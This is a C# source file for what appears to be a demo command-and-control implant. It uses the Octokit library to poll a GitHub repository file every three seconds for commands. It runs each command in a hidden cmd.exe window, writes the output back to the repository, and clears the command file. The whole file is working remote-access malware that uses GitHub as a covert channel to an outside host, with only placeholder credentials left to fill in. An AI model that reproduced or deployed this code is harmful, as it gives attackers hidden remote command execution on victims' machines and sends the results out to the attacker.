using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Octokit;
using System.Threading;
using System.Diagnostics;

namespace democ2
{
    internal class Program
    {
        private const string GitHubToken = "Your Token";
        private const string RepositoryOwner = "Your Name";
        private const string RepositoryName = "Your Repo Name";
        private const string FilePath = "input.txt";
        private const string OutputFilePath = "output.txt";
        
        static async Task Main(string[] args)
        {
            var client = new GitHubClient(new ProductHeaderValue("my-cool-app"));
            Console.WriteLine("Octokit!");

            var tokenAuth = new Credentials(GitHubToken);
            client.Credentials = tokenAuth;

            while (true)
            {
                var fileContent = await client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, FilePath);
                var inputCmd = fileContent[0].Content;

                if (!string.IsNullOrEmpty(inputCmd))
                {
                    string cmdResults = ExecuteCommand(inputCmd);

                    //write results to output.txt
                    var outputFileContent = client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, OutputFilePath).Result[0];
                    var updateRequest = new UpdateFileRequest("update", cmdResults, outputFileContent.Sha);
                    client.Repository.Content.UpdateFile(RepositoryOwner, RepositoryName, OutputFilePath, updateRequest).Wait();

                    //empty out input.txt after executing the cmd
                    var emptyInputFile = client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, FilePath).Result[0];
                    var updateRequest2 = new UpdateFileRequest("update", "", emptyInputFile.Sha);
                    client.Repository.Content.UpdateFile(RepositoryOwner, RepositoryName, FilePath, updateRequest2).Wait();

                }

                Thread.Sleep(3000);
            }

        }
        static string ExecuteCommand(string command)
        {
            var processStartInfo = new ProcessStartInfo("cmd.exe")
            {
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = new Process { StartInfo = processStartInfo };
            process.Start();

            process.StandardInput.WriteLine($"cmd /k {command}");
            process.StandardInput.Close();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }
    }
}
